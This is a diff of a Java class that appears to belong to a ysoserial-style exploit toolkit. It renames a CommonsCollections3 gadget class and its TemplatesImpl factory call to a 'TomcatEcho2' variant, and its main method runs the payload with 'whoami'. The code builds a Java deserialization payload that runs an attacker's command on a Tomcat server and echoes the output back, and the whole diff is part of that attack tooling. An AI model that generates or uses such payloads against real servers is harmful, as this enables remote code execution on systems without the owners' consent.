@@ -15,9 +15,9 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CommonsCollections3TomcatEcho extends CommonsCollections3 {
+public class CommonsCollections3TomcatEcho2 extends CommonsCollections3 {
     public Object getObject(final String command) throws Exception {
-        Object templatesImpl = Gadgets.createTemplatesImplTomcatEcho(command);
+        Object templatesImpl = Gadgets.createTemplatesImplTomcatEcho2(command);
 
         // inert chain for setup
         final Transformer transformerChain = new ChainedTransformer(
@@ -43,6 +43,6 @@ public class CommonsCollections3TomcatEcho extends CommonsCollections3 {
     }
 
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections3TomcatEcho.class, new String[]{"whoami"});
+        PayloadRunner.run(CommonsCollections3TomcatEcho2.class, new String[]{"whoami"});
     }
 }
